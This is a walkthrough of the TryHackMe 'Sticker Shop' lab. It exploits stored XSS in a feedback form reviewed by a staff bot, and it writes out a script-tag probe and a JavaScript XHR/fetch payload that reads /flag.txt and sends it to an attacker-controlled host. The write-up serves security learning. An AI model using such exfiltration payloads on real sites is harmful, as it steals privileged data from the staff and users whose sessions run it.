---
title: "TryHackMe The Sticker Shop — Walkthrough"
date: 2026-02-22 09:15:00 +0300
categories: [TryHackMe, Web]
tags: [xss, javascript, stolen-content, beginner]
pin: false
---

The Sticker Shop is a short room about exploiting **Cross-Site Scripting (XSS)** to steal page contents and recover a flag that returns **401 Unauthorized** to direct requests.

## Initial Enumeration

### Nmap scan

```bash
nmap -T4 -n -sC -sV -Pn -p- <TARGET_IP>
```

Open ports:

| Port | Service | Version |
| ---- | ------- | ------- |
| 22 | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 |
| 8080 | HTTP | Werkzeug/3.0.1 Python/3.8.10 |

Page title: **Cat Sticker Shop**.

### Web 8080

`http://<TARGET_IP>:8080/` lists stickers and prices. There is no purchase flow, but feedback can be submitted at:

```text
http://<TARGET_IP>:8080/submit_feedback
```

After submission, the site states a staff member will review the feedback shortly.

The room goal is to read:

```text
http://<TARGET_IP>:8080/flag.txt
```

Direct access returns **401 Unauthorized**.

![Sticker shop and 401 on flag.txt](/assets/img/posts/sticker-shop/enum.png)

## Obtaining the Flag

### Discovering XSS

On the feedback form, test XSS with a simple payload such as:

```html
<script src="http://<ATTACKER_IP>/test"></script>
```

Start a listener:

```bash
python3 -m http.server 80
```

The target server requests `/test` from your host — confirming XSS execution (likely in a staff review context).

### Stealing page contents

The flag endpoint remains forbidden to you, but a **staff bot** reviewing feedback may have access.

Because XSS runs JavaScript in that session, exfiltrate `/flag.txt` with `XMLHttpRequest`:

```javascript
var target_url = "/flag.txt";
var my_server = "http://<ATTACKER_IP>/data";
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
 if (xhr.readyState == XMLHttpRequest.DONE) {
 fetch(my_server + "?" + xhr.responseText)
 }
}
xhr.open('GET', target_url, true);
xhr.send(null);
```

Wrap the script in `<script>...</script>` tags and submit through the feedback form.

After the bot executes the payload, your HTTP server receives the flag in the query string:

```text
GET /data?THM{...} HTTP/1.1
```

![XSS callback receiving flag on attacker server](/assets/img/posts/sticker-shop/xss-exfil.png)

## Takeaways

- **401 on sensitive routes** does not protect against **session-bound XSS** if a privileged bot browses user input.
- Always validate **stored/reflected XSS** on forms meant for admin or staff review.
- Exfiltration via **`fetch()` / XHR + outbound callback** is a standard blind XSS pattern.
